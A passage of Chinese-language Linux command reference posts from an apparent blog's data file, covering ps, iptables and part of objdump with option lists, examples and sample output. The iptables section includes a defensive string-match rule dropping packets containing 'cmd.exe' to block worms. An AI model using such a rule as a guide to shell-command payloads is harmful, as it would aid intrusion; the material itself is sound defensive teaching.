--sid&lt;阶段作业&gt;：此选项的效果和指定&quot;-s&quot;选项相同。 --tty&lt;终端机编号&gt;：此选项的效果和指定&quot;-t&quot;选项相同。 --user&lt;用户名称&gt;：此选项的效果和指定&quot;-U&quot;选项相同。 --User&lt;用户识别码&gt;：此选项的效果和指定&quot;-U&quot;选项相同。 --version：此选项的效果和指定&quot;-V&quot;选项相同。 --widty&lt;每列字符数&gt;：此选项的效果和指定&quot;-cols&quot;选项相同。 由于 ps 命令能够支持的系统类型相当的多，所以选项多的离谱！ 实例 ps axo pid,comm,pcpu # 查看进程的 PID、名称以及 CPU 占用率 ps aux | sort -rnk 4 # 按内存资源的使用量对进程进行排序 ps aux | sort -nk 3 # 按 CPU 资源的使用量对进程进行排序 ps -A # 显示所有进程信息 ps -u root # 显示指定用户信息 ps -efL # 查看线程数 ps -e -o &quot;%C : %p :%z : %a&quot;|sort -k5 -nr # 查看进程并按内存使用大小排列 ps -ef # 显示所有进程信息，连同命令行 ps -ef | grep ssh # ps 与 grep 常用组合用法，查找特定进程 ps -C nginx # 通过名字或命令搜索进程 ps aux --sort=-pcpu,+pmem # CPU 或者内存进行排序,-降序，+升序 ps -f --forest -C nginx # 用树的风格显示进程的层次关系 ps -o pid,uname,comm -C nginx # 显示一个父进程的子进程 ps -e -o pid,uname=USERNAME,pcpu=CPU_USAGE,pmem,comm # 重定义标签 ps -e -o pid,comm,etime # 显示进程运行的时间 ps -aux | grep named # 查看 named 进程详细信息 ps -o command -p 91730 | sed -n 2p # 通过进程 id 获取服务名称 将目前属于您自己这次登入的 PID 与相关信息列示出来 ps -l # UID PID PPID F CPU PRI NI SZ RSS WCHAN S ADDR TTY TIME CMD # 501 566 559 4006 0 31 0 4317620 228 - Ss 0 ttys001 0:00.05 /App...cOS/iTerm2 --server /usr/bin/login -fpl kenny /Ap...s/MacOS/iTerm2 --launch_shel # 501 592 577 4006 0 31 0 4297048 52 - S 0 ttys001 0:00.63 -zsh F 代表这个程序的旗标 (flag)， 4 代表使用者为 super user S 代表这个程序的状态 (STAT)，关于各 STAT 的意义将在内文介绍 UID 程序被该 UID 所拥有 PID 就是这个程序的 ID ！ PPID 则是其上级父程序的 ID C CPU 使用的资源百分比 PRI 这个是 Priority (优先执行序) 的缩写，详细后面介绍 NI 这个是 Nice 值，在下一小节我们会持续介绍 ADDR 这个是 kernel function，指出该程序在内存的那个部分。如果是个 running 的程序，一般就是 &quot;-&quot; SZ 使用掉的内存大小 WCHAN 目前这个程序是否正在运作当中，若为 - 表示正在运作 TTY 登入者的终端机位置 TIME 使用掉的 CPU 时间。 CMD 所下达的指令为何 在预设的情况下， `ps` 仅会列出与目前所在的 `bash shell` 有关的 `PID` 而已，所以， 当我使用 `ps -l` 的时候，只有三个 PID。 列出目前所有的正在内存当中的程序 ps aux # USER PID %CPU %MEM VSZ RSS TT STAT STARTED TIME COMMAND # kenny 6155 21.3 1.7 7969944 284912 ?? S 二 03 下午 199:14.14 /Appl...OS/WeChat # kenny 559 20.4 0.8 4963740 138176 ?? S 二 03 下午 33:28.27 /Appl...S/iTerm2 # _windowserver 187 18.0 0.6 7005748 95884 ?? Ss 二 03 下午 288:44.97 /Syst...Light.WindowServer -daemon # kenny 1408 10.7 2.1 5838592 347348 ?? S 二 03 下午 138:51.63 /Appl...nts/MacOS/Google Chrome # kenny 327 5.8 0.5 5771984 79452 ?? S 二 03 下午 2:51.58 /Syst...pp/Contents/MacOS/Finder USER：该 process 属于那个使用者账号的 PID ：该 process 的号码 %CPU：该 process 使用掉的 CPU 资源百分比 %MEM：该 process 所占用的物理内存百分比 VSZ ：该 process 使用掉的虚拟内存量 (Kbytes) RSS ：该 process 占用的固定的内存量 (Kbytes) TTY ：该 process 是在那个终端机上面运作，若与终端机无关，则显示 ?，另外， tty1-tty6 是本机上面的登入者程序，若为 pts/0 等等的，则表示为由网络连接进主机的程序。 STAT：该程序目前的状态，主要的状态有 R ：该程序目前正在运作，或者是可被运作 S ：该程序目前正在睡眠当中 (可说是 idle 状态)，但可被某些讯号 (signal) 唤醒。 T ：该程序目前正在侦测或者是停止了 Z ：该程序应该已经终止，但是其父程序却无法正常的终止他，造成 zombie (疆尸) 程序的状态 START：该 process 被触发启动的时间 TIME ：该 process 实际使用 CPU 运作的时间 COMMAND：该程序的实际指令 列出类似程序树的程序显示 ps -axjf # USER PID PPID PGID SESS JOBC STAT TT TIME COMMAND UID C STIME TTY # root 1 0 1 0 0 Ss ?? 10:51.90 /sbin/launchd 0 0 二 03 下午 ?? # root 50 1 50 0 0 Ss ?? 0:10.07 /usr/sbin/syslog 0 0 二 03 下午 ?? # root 51 1 51 0 0 Ss ?? 0:29.90 /usr/libexec/Use 0 0 二 03 下午 ?? 找出与 cron 与 syslog 这两个服务有关的 PID 号码 ps aux | egrep '(cron|syslog)' # root 50 0.0 0.0 4305532 1284 ?? Ss 二 03 下午 0:10.08 /usr/sbin/syslogd # kenny 90167 0.0 0.0 4258468 184 s007 R+ 9:23 下午 0:00.00 egrep (cron|syslog) 把所有进程显示出来，并输出到 ps001.txt 文件 ps -aux &gt; ps001.txt 输出指定的字段 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ps","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ps/","stats":{"text":"11 min read","time":640000,"words":2636,"minutes":11},"date":"2022-02-02 02:58:02","dateFormat":"2022-02-02"},{"content":"Linux 上常用的防火墙软件。 补充说明 iptables 命令是 Linux 上常用的防火墙软件，是 netfilter 项目的一部分。可以直接配置，也可以通过许多前端和图形界面配置。 语法 iptables (选项) (参数) 选项 -t, --table table 对指定的表 table 进行操作， table 必须是 raw， nat，filter，mangle 中的一个。如果不指定此选项，默认的是 filter 表。 # 通用匹配：源地址目标地址的匹配 -p：指定要匹配的数据包协议类型； -s, --source [!] address[/mask] ：把指定的一个／一组地址作为源地址，按此规则进行过滤。当后面没有 mask 时，address 是一个地址，比如：192.168.1.1；当 mask 指定时，可以表示一组范围内的地址，比如：192.168.1.0/255.255.255.0。 -d, --destination [!] address[/mask] ：地址格式同上，但这里是指定地址为目的地址，按此进行过滤。 -i, --in-interface [!] &lt;网络接口name&gt; ：指定数据包的来自来自网络接口，比如最常见的 eth0 。注意：它只对 INPUT，FORWARD，PREROUTING 这三个链起作用。如果没有指定此选项， 说明可以来自任何一个网络接口。同前面类似，&quot;!&quot; 表示取反。 -o, --out-interface [!] &lt;网络接口name&gt; ：指定数据包出去的网络接口。只对 OUTPUT，FORWARD，POSTROUTING 三个链起作用。 # 查看管理命令 -L, --list [chain] 列出链 chain 上面的所有规则，如果没有指定链，列出表上所有链的所有规则。 # 规则管理命令 -A, --append chain rule-specification 在指定链 chain 的末尾插入指定的规则，也就是说，这条规则会被放到最后，最后才会被执行。规则是由后面的匹配来指定。 -I, --insert chain [rulenum] rule-specification 在链 chain 中的指定位置插入一条或多条规则。如果指定的规则号是1，则在链的头部插入。这也是默认的情况，如果没有指定规则号。 -D, --delete chain rule-specification -D, --delete chain rulenum 在指定的链 chain 中删除一个或多个指定规则。 -R num：Replays替换/修改第几条规则 # 链管理命令（这都是立即生效的） -P, --policy chain target ：为指定的链 chain 设置策略 target。注意，只有内置的链才允许有策略，用户自定义的是不允许的。 -F, --flush [chain] 清空指定链 chain 上面的所有规则。如果没有指定链，清空该表上所有链的所有规则。 -N, --new-chain chain 用指定的名字创建一个新的链。 -X, --delete-chain [chain] ：删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。如果没有指定链名，则会删除该表中所有非内置的链。 -E, --rename-chain old-chain new-chain ：用指定的新名字去重命名指定的链。这并不会对链内部造成任何影响。 -Z, --zero [chain] ：把指定链，或者表中的所有链上的所有计数器清零。 -j, --jump target &lt;指定目标&gt; ：即满足某条件时该执行什么样的动作。target 可以是内置的目标，比如 ACCEPT，也可以是用户自定义的链。 -h：显示帮助信息； 基本参数 参数 作用 -P 设置默认策略:iptables -P INPUT (DROP -F 清空规则链 -L 查看规则链 -A 在规则链的末尾加入新规则 -I num 在规则链的头部加入新规则 -D num 删除某一条规则 -s 匹配来源地址IP/MASK，加叹号&quot;!&quot;表示除这个IP外。 -d 匹配目标地址 -i 网卡名称 匹配从这块网卡流入的数据 -o 网卡名称 匹配从这块网卡流出的数据 -p 匹配协议,如tcp,udp,icmp --dport num 匹配目标端口号 --sport num 匹配来源端口号 命令选项输入顺序 iptables -t 表名 &lt;-A/I/D/R&gt; 规则链名 [规则号 ] &lt;-i/o 网卡名&gt; -p 协议名 &lt;-s 源 IP/源子网&gt; --sport 源端口 &lt;-d 目标 IP/目标子网&gt; --dport 目标端口 -j 动作 工作机制 规则链名包括 (也被称为五个钩子函数（hook functions）)： INPUT 链 ：处理输入数据包。 OUTPUT 链 ：处理输出数据包。 FORWARD 链 ：处理转发数据包。 PREROUTING 链 ：用于目标地址转换（DNAT）。 POSTOUTING 链 ：用于源地址转换（SNAT）。 防火墙的策略 防火墙策略一般分为两种，一种叫通策略，一种叫堵策略，通策略，默认门是关着的，必须要定义谁能进。堵策略则是，大门是洞开的，但是你必须有身份认证，否则不能进。所以我们要定义，让进来的进来，让出去的出去，所以通，是要全通，而堵，则是要选择。当我们定义的策略的时候，要分别定义多条功能，其中：定义数据包中允许或者不允许的策略，filter 过滤的功能，而定义地址转换的功能的则是 nat 选项。为了让这些功能交替工作，我们制定出了“表”这个定义，来定义、区分各种不同的工作功能和处理方式。 我们现在用的比较多个功能有 3 个： filter 定义允许或者不允许的，只能做在 3 个链上：INPUT ，FORWARD ，OUTPUT nat 定义地址转换的，也只能做在 3 个链上：PREROUTING ，OUTPUT ，POSTROUTING mangle 功能:修改报文原数据，是 5 个链都可以做：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING 我们修改报文原数据就是来修改 TTL 的。能够实现将数据包的元数据拆开，在里面做标记/修改内容的。而防火墙标记，其实就是靠 mangle 来实现的。 小扩展: 对于 filter 来讲一般只能做在 3 个链上：INPUT ，FORWARD ，OUTPUT 对于 nat 来讲一般也只能做在 3 个链上：PREROUTING ，OUTPUT ，POSTROUTING 而 mangle 则是 5 个链都可以做：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING iptables/netfilter（这款软件）是工作在用户空间的，它可以让规则进行生效的，本身不是一种服务，而且规则是立即生效的。而我们 iptables 现在被做成了一个服务，可以进行启动，停止的。启动，则将规则直接生效，停止，则将规则撤销。 iptables 还支持自己定义链。但是自己定义的链，必须是跟某种特定的链关联起来的。在一个关卡设定，指定当有数据的时候专门去找某个特定的链来处理，当那个链处理完之后，再返回。接着在特定的链中继续检查。 注意：规则的次序非常关键，谁的规则越严格，应该放的越靠前，而检查规则的时候，是按照从上往下的方式进行检查的。 表名包括： raw ：高级功能，如：网址过滤。 mangle ：数据包修改（QOS），用于实现服务质量。 nat ：地址转换，用于网关路由器。 filter ：包过滤，用于防火墙规则。 动作包括： ACCEPT ：接收数据包。 DROP ：丢弃数据包。 REDIRECT ：重定向、映射、透明代理。 SNAT ：源地址转换。 DNAT ：目标地址转换。 MASQUERADE ：IP 伪装（NAT），用于 ADSL。 LOG ：日志记录。 ┏╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┓ ┌───────────────┐ ┃ Network ┃ │ table: filter │ ┗━━━━━━━┳━━━━━━━┛ │ chain: INPUT │◀────┐ │ └───────┬───────┘ │ ▼ │ │ ┌───────────────────┐ ┌ ▼ ┐ │ │ table: nat │ │local process│ │ │ chain: PREROUTING │ └ ┘ │ └─────────┬─────────┘ │ │ │ ▼ │ ▼ ┌─────────────────┐ ┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅ │ ┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅ │table: nat │ Routing decision └───── outing decision ─────▶│chain: PREROUTING│ ┅┅┅┅┅┅┅┅┅┳┅┅┅┅┅┅┅┅┅ ┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅ └────────┬────────┘ │ │ ▼ │ ┌───────────────┐ │ │ table: nat │ ┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅ │ │ chain: OUTPUT │ ┌─────▶ outing decision ◀──────────────┘ └───────┬───────┘ │ ┅┅┅┅┅┅┅┅┳┅┅┅┅┅┅┅┅ │ │ │ ▼ │ ▼ ┌───────────────┐ │ ┌────────────────────┐ │ table: filter │ │ │ chain: POSTROUTING │ │ chain: OUTPUT ├────┘ └──────────┬─────────┘ └───────────────┘ │ ▼ ┏╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┓ ┃ Network ┃ ┗━━━━━━━━━━━━━━━┛ 实例 空当前的所有规则和计数 iptables -F # 清空所有的防火墙规则 iptables -X # 删除用户自定义的空链 iptables -Z # 清空计数 配置允许 ssh 端口连接 iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT # 22为你的ssh端口， -s 192.168.1.0/24表示允许这个网段的机器来连接，其它网段的ip地址是登陆不了你的机器的。 -j ACCEPT表示接受这样的请求 允许本地回环地址可以正常使用 iptables -A INPUT -i lo -j ACCEPT #本地圆环地址就是那个127.0.0.1，是本机上使用的,它进与出都设置为允许 iptables -A OUTPUT -o lo -j ACCEPT 设置默认的规则 iptables -P INPUT DROP # 配置默认的不让进 iptables -P FORWARD DROP # 默认的不允许转发 iptables -P OUTPUT ACCEPT # 默认的可以出去 配置白名单 iptables -A INPUT -p all -s 192.168.1.0/24 -j ACCEPT # 允许机房内网机器可以访问 iptables -A INPUT -p all -s 192.168.140.0/24 -j ACCEPT # 允许机房内网机器可以访问 iptables -A INPUT -p tcp -s 183.121.3.7 --dport 3380 -j ACCEPT # 允许183.121.3.7访问本机的3380端口 开启相应的服务端口 iptables -A INPUT -p tcp --dport 80 -j ACCEPT # 开启80端口，因为web对外都是这个端口 iptables -A INPUT -p icmp --icmp-type 8 -j ACCEPT # 允许被ping iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT # 已经建立的连接得让它进来 保存规则到配置文件中 cp /etc/sysconfig/iptables /etc/sysconfig/iptables.bak # 任何改动之前先备份，请保持这一优秀的习惯 iptables-save &gt; /etc/sysconfig/iptables cat /etc/sysconfig/iptables 列出已设置的规则 iptables -L [-t 表名 ] [链名 ] 四个表名 raw，nat，filter，mangle 五个规则链名 INPUT、OUTPUT、FORWARD、PREROUTING、POSTROUTING filter 表包含INPUT、OUTPUT、FORWARD三个规则链 iptables -L -t nat # 列出 nat 上面的所有规则 # ^ -t 参数指定，必须是 raw， nat，filter，mangle 中的一个 iptables -L -t nat --line-numbers # 规则带编号 iptables -L INPUT iptables -L -nv # 查看，这个列表看起来更详细 清除已有规则 iptables -F INPUT # 清空指定链 INPUT 上面的所有规则 iptables -X INPUT # 删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。 # 如果没有指定链名，则会删除该表中所有非内置的链。 iptables -Z INPUT # 把指定链，或者表中的所有链上的所有计数器清零。 删除已添加的规则 # 添加一条规则 iptables -A INPUT -s 192.168.1.5 -j DROP 将所有 iptables 以序号标记显示，执行： iptables -L -n --line-numbers 比如要删除 INPUT 里序号为 8 的规则，执行： iptables -D INPUT 8 开放指定的端口 iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT #允许本地回环接口(即运行本机访问本机) iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT #允许已建立的或相关连的通行 iptables -A OUTPUT -j ACCEPT #允许所有本机向外的访问 iptables -A INPUT -p tcp --dport 22 -j ACCEPT #允许访问22端口 iptables -A INPUT -p tcp --dport 80 -j ACCEPT #允许访问80端口 iptables -A INPUT -p tcp --dport 21 -j ACCEPT #允许ftp服务的21端口 iptables -A INPUT -p tcp --dport 20 -j ACCEPT #允许FTP服务的20端口 iptables -A INPUT -j reject #禁止其他未允许的规则访问 iptables -A FORWARD -j REJECT #禁止其他未允许的规则访问 屏蔽 IP iptables -A INPUT -p tcp -m tcp -s 192.168.0.8 -j DROP # 屏蔽恶意主机（比如，192.168.0.8 iptables -I INPUT -s 123.45.6.7 -j DROP #屏蔽单个IP的命令 iptables -I INPUT -s 123.0.0.0/8 -j DROP #封整个段即从123.0.0.1到123.255.255.254的命令 iptables -I INPUT -s 124.45.0.0/16 -j DROP #封IP段即从123.45.0.1到123.45.255.254的命令 iptables -I INPUT -s 123.45.6.0/24 -j DROP #封IP段即从123.45.6.1到123.45.6.254的命令 指定数据包出去的网络接口 只对 OUTPUT，FORWARD，POSTROUTING 三个链起作用。 iptables -A FORWARD -o eth0 查看已添加的规则 iptables -L -n -v Chain INPUT (policy DROP 48106 packets, 2690K bytes) pkts bytes target prot opt in out source destination 5075 589K ACCEPT all -- lo * 0.0.0.0/0 0.0.0.0/0 191K 90M ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:22 1499K 133M ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 4364K 6351M ACCEPT all -- * * 0.0.0.0/0 0.0.0.0/0 state RELATED,ESTABLISHED 6256 327K ACCEPT icmp -- * * 0.0.0.0/0 0.0.0.0/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 3382K packets, 1819M bytes) pkts bytes target prot opt in out source destination 5075 589K ACCEPT all -- * lo 0.0.0.0/0 0.0.0.0/0 启动网络转发规则 公网210.14.67.7让内网192.168.188.0/24上网 iptables -t nat -A POSTROUTING -s 192.168.188.0/24 -j SNAT --to-source 210.14.67.127 端口映射 本机的 2222 端口映射到内网 虚拟机的 22 端口 iptables -t nat -A PREROUTING -d 210.14.67.127 -p tcp --dport 2222 -j DNAT --to-dest 192.168.188.115:22 字符串匹配 比如，我们要过滤所有 TCP 连接中的字符串test，一旦出现它我们就终止这个连接，我们可以这么做： iptables -A INPUT -p tcp -m string --algo kmp --string &quot;test&quot; -j REJECT --reject-with tcp-reset iptables -L # Chain INPUT (policy ACCEPT) # target prot opt source destination # REJECT tcp -- anywhere anywhere STRING match &quot;test&quot; ALGO name kmp TO 65535 reject-with tcp-reset # # Chain FORWARD (policy ACCEPT) # target prot opt source destination # # Chain OUTPUT (policy ACCEPT) # target prot opt source destination 阻止 Windows 蠕虫的攻击 iptables -I INPUT -j DROP -p tcp -s 0.0.0.0/0 -m string --algo kmp --string &quot;cmd.exe&quot; 防止 SYN 洪水攻击 iptables -A INPUT -p tcp --syn -m limit --limit 5/second -j ACCEPT ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"iptables","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/iptables/","stats":{"text":"14 min read","time":833000,"words":3306,"minutes":14},"date":"2022-02-02 02:15:46","dateFormat":"2022-02-02"},{"content":"显示二进制文件信息。 补充说明 objdump 命令是用查看目标文件或者可执行的目标文件的构成的 gcc 工具。 选项 -a --archive-headers # 显示档案库的成员信息,类似ls -l将lib*.a的信息列出。 -b bfdname --target=bfdname # 指定目标码格式。这不是必须的，objdump能自动识别许多格式，比如： objdump -b oasys -m vax -h fu.o # 显示fu.o的头部摘要信息，明确指出该文件是Vax系统下用Oasys编译器生成的目标文件。objdump -i将给出这里可以指定的目标码格式列表。 -C --demangle # 将底层的符号名解码成用户级名字，除了去掉所开头的下划线之外，还使得C++函数名以可理解的方式显示出来。 --debugging -g # 显示调试信息。企图解析保存在文件中的调试信息并以C语言的语法显示出来。仅仅支持某些类型的调试信息。有些其他的格式被readelf -w支持。 -e --debugging-tags # 类似-g选项，但是生成的信息是和ctags工具相兼容的格式。 --disassemble -d # 从objfile中反汇编那些特定指令机器码的section。 -D --disassemble-all # 与 -d 类似，但反汇编所有section. --prefix-addresses # 反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式。 -EB -EL --endian={big|little} # 指定目标文件的小端。这个项将影响反汇编出来的指令。在反汇编的文件没描述小端信息的时候用。例如S-records. -f --file-headers 显示objfile中每个文件的整体头部摘要信息。 -h --section-headers --headers 显示目标文件各个section的头部摘要信息。 -H --help 简短的帮助信息。 -i --info 显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 -j name --section=name 仅仅显示指定名称为name的section的信息 -l --line-numbers 用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用使用-ld和使用-d的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。 -m machine --architecture=machine 指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如S-records)，这个选项很有用。可以用-i选项列出这里能够指定的架构. --reloc -r 显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。 --dynamic-reloc -R 显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。 -s --full-contents 显示指定section的完整内容。默认所有的非空section都会被显示。 -S --source 尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。 --show-raw-insn 反汇编的时候，显示每条汇编指令对应的机器码，如不指定--prefix-addresses，这将是缺省选项。 --no-show-raw-insn 反汇编时，不显示汇编指令的机器码，如不指定--prefix-addresses，这将是缺省选项。 --start-address=address 从指定地址开始显示数据，该选项影响-d、-r和-s选项的输出。 --stop-address=address 显示数据直到指定地址为止，该项影响-d、-r和-s选项的输出。 -t --syms 显示文件的符号表入口。类似于nm -s提供的信息 -T --dynamic-syms 显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。它显示的信息类似于 nm -D|--dynamic 显示的信息。 -V --version 版本信息 --all-headers -x 显示所可用的头信息，包括符号表、重定位入口。-x 等价于-a -f -h -r -t 同时指定。 -z --disassemble-zeroes 一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编。 @file 可以将选项集中到一个文件中，然后使用这个@file选项载入。 实例 首先，在给出后面大部分测试所基于的源代码以及编译指令。 源代码如下： root@localhost [test]# nl mytest.cpp void printTest() { char a; a = 'a'; } void printTest2() { int a = 2; a+=2; } 对以上源代码进行编译，如下： [root@localhost test]# g++ -c -g mytest.cpp 这里，生成的文件是 mytest.o，为了方便测试包含了调试的信息，对可执行文件的测试，显示的结果类似。 查看当前使用的 objdump 的版本号： [root@localhost test]# objdump -V GNU objdump 2.17.50.0.6-14.el5 20061020 Copyright 2005 free Software Foundation, Inc. This program is free software; you may redistribute it under the terms of the GNU General Public License. This program has absolutely no warranty. 查看档案库文件中的信息： [root@localhost test]# objdump -a libmy2.a In archive libmy2.a: myfile.o: file format elf32-i386 rwxrwxrwx 0/0 2724 Nov 16 16:06 2009 myfile.o mytest.o: file format elf32-i386 rw-r--r-- 0/0 727 Jul 13 15:32 2011 mytest.o 这里，libmy2.a 是一个使用 ar 命令将多个 .o 目标文件打包而生成的静态库。命令的输出类似ar -tv，相比较ar -tv输出如下： [root@localhost test]# ar -tv libmy2.a rwxrwxrwx 0/0 2724 Nov 16 16:06 2009 myfile.o rw-r--r-- 0/0 727 Jul 13 15:32 2011 mytest.o 显示可用的架构和目标结构列表： [root@localhost test]# objdump -i BFD header file version 2.17.50.0.6-14.el5 20061020 elf32-i386 (header little endian, data little endian) i386 a.out-i386-linux (header little endian, data little endian) i386 efi-app-ia32 (header little endian, data little endian) i386 elf64-x86-64 (header little endian, data little endian) i386 elf64-little (header little endian, data little endian) i386 elf64-big (header big endian, data big endian) i386 elf32-little (header little endian, data little endian) i386 elf32-big (header big endian, data big endian) i386 srec (header endianness unknown, data endianness unknown) i386 symbolsrec (header endianness unknown, data endianness unknown) i386 tekhex (header endianness unknown, data endianness unknown) i386 binary (header endianness unknown, data endianness unknown) i386 ihex (header endianness unknown, data endianness unknown) i386 trad-core (header endianness unknown, data endianness unknown) elf32-i386 a.out-i386-linux efi-app-ia32 elf64-x86-64 i386 elf32-i386 a.out-i386-linux efi-app-ia32 elf64-x86-64 elf64-little elf64-big elf32-little elf32-big srec symbolsrec i386 elf64-little elf64-big elf32-little elf32-big srec symbolsrec tekhex binary ihex trad-core i386 tekhex binary ihex --------- 这里，显示的信息是相对于 -b 或者 -m 选项可用的架构和目标格式列表。 显示 mytest.o 文件中的 text 段的内容： [root@localhost test]# objdump --section=.text -s mytest.o mytest.o: file format elf32-i386 Contents of section .text: 0000 5589e583 ec10c645 ff61c9c3 5589e583 U......E.a..U... 0010 ec10c745 fc020000 008345fc 02c9c3 ...E......E.... 这里注意，不能单独使用-j 或者--section，例如objdump --section=.text mytest.o是不会运行成功的。 反汇编 mytest.o 中的 text 段内容，并尽可能用源代码形式表示： [root@localhost test]# objdump -j .text -S mytest.o mytest.o: file format elf32-i386 Disassembly of section .text: 00000000 &lt;_Z9printTestv&gt;: void printTest() 0: 55 push %ebp 1: 89 e5 mov %esp,%ebp 3: 83 ec 10 sub $0x10,%esp { char a; a = 'a'; 6: c6 45 ff 61 movb $0x61,0xffffffff(%ebp) } a: c9 leave b: c3 ret 000000c &lt;_Z10printTest2v&gt;: void printTest2() c: 55 push %ebp d: 89 e5 mov %esp,%ebp f: 83 ec 10 sub $0x10,%esp { int a = 2; 12: c7 45 fc 02 00 00 00 movl $0x2,0xfffffffc(%ebp) a+=2; 19: 83 45 fc 02 addl $0x2,0xfffffffc(%ebp) } 1d: c9 leave 1e: c3 ret 这里注意，不能单独使用-j 或者--section，例如objdump -j .text mytest.o 是不会运行成功的。另外-S 命令对于包含调试信息的目标文件，显示的效果比较好，如果编译时没有指定 g++的-g 选项，那么目标文件就不包含调试信息，那么显示效果就差多了。 反汇编出 mytest.o 的源代码： [root@localhost test]# objdump -S mytest.o mytest.o: file format elf32-i386Disassembly of section .text:00000000 &lt;_Z9printTestv&gt;:void printTest() 0: 55 push %ebp 1: 89 e5 mov %esp,%ebp 3: 83 ec 10 sub $0x10,%esp{ char a; a = 'a'; 6: c6 45 ff 61 movb $0x61,0xffffffff(%ebp)} a: c9 leave b: c3 ret0000000c &lt;_Z10printTest2v&gt;:void printTest2() c: 55 push %ebp d: 89 e5 mov %esp,%ebp f: 83 ec 10 sub $0x10,%esp{ int a = 2; 12: c7 45 fc 02 00 00 00 movl $0x2,0xfffffffc(%ebp) a+=2; 19: 83 45 fc 02 addl $0x2,0xfffffffc(%ebp)} 1d: c9 leave 1e: c3 ret 这里，尤其当编译的时候指定了-g 这种调试参数时，反汇编的效果比较明显。隐含了-d 参数。 显示文件的符号表入口： [root@localhost test]# objdump -t mytest.o mytest.o: file format elf32-i386 SYMBOL TABLE: 00000000 l df *ABS* 00000000 mytest.cpp 00000000 l d .text 00000000 .text 00000000 l d .data 00000000 .data 00000000 l d .bss 00000000 .bss 00000000 l d .debug_abbrev 00000000 .debug_abbrev 00000000 l d .debug_info 00000000 .debug_info 00000000 l d .debug_line 00000000 .debug_line 00000000 l d .debug_frame 00000000 .debug_frame 00000000 l d .debug_loc 00000000 .debug_loc 00000000 l d .debug_pubnames 00000000 .debug_pubnames 00000000 l d .debug_aranges 00000000 .debug_aranges 00000000 l d .note.GNU-stack 00000000 .note.GNU-stack 00000000 l d .comment 00000000 .comment 00000000 g F .text 0000000c _Z9printTestv 00000000 *UND* 00000000 __gxx_personality_v0 0000000c g F .text 00000013 _Z10printTest2v 这里，输出的信息类似nm -s命令的输出，相比较之下，nm 命令的输出如下： [root@localhost test]# nm -s mytest.o 0000000c T _Z10printTest2v 00000000 T _Z9printTestv U __gxx_personality_v0 显示文件的符号表入口，将底层符号解码并表示成用户级别： [root@localhost test]# objdump -t -C mytest.o mytest.o: file format elf32-i386 SYMBOL TABLE: 00000000 l df *ABS* 00000000 mytest.cpp 00000000 l d .text 00000000 .text 00000000 l d .data 00000000 .data 00000000 l d .bss 00000000 .bss 00000000 l d .debug_abbrev 00000000 .debug_abbrev 00000000 l d .debug_info 00000000 .debug_info 00000000 l d .debug_line 00000000 .debug_line 00000000 l d .debug_frame 00000000 .debug_frame 00000000 l d .debug_loc 00000000 .debug_loc 00000000 l d .debug_pubnames 00000000 .debug_pubnames 00000000 l d .debug_aranges 00000000 .debug_aranges 00000000 l d .note.GNU-stack 00000000 .note.GNU-stack 00000000 l d .comment 00000000 .comment 00000000 g F .text 0000000c printTest() 00000000 *UND* 00000000 __gxx_personality_v0 0000000c g F .text 00000013 printTest2() 这里，和没-C 相比，printTest2 函数可读性增加了。 反汇编目标文件的特定机器码段： [root@localhost test]# objdump -d mytest.o mytest.o: file format elf32-i386 Disassembly of section .text: 00000000 &lt;_Z9printTestv&gt;: 0: 55 push %ebp 1: 89 e5 mov %esp,%ebp 3: 83 ec 10 sub $0x10,%esp 6: c6 45 ff 61 movb $0x61,0xffffffff(%ebp) a: c9 leave b: c3 ret 0000000c &lt;_Z10printTest2v&gt;: c: 55 push %ebp d: 89 e5 mov %esp,%ebp f: 83 ec 10 sub $0x10,%esp 12: c7 45 fc 02 00 00 00 movl $0x2,0xfffffffc(%ebp) 19: 83 45 fc 02 addl $0x2,0xfffffffc(%ebp) 1d: c9 leave 1e: c3 ret 这里，对 text 段的内容进行了反汇编。 反汇编特定段，并将汇编代码对应的文件名称和行号对应上： [root@localhost test]# objdump -d -l mytest.o mytest.o: file format elf32-i386 Disassembly of section .text: 00000000 &lt;_Z9printTestv&gt;: _Z9printTestv(): /root/test/04_libraryTest/mytest.cpp:1 0: 55 push %ebp 1: 89 e5 mov %esp,%ebp 3: 83 ec 10 sub $0x10,%esp /root/test/04_libraryTest/mytest.cpp:4 6: c6 45 ff 61 movb $0x61,0xffffffff(%ebp) /root/test/04_libraryTest/mytest.cpp:5 a: c9 leave b: c3 ret 0000000c &lt;_Z10printTest2v&gt;: _Z10printTest2v(): 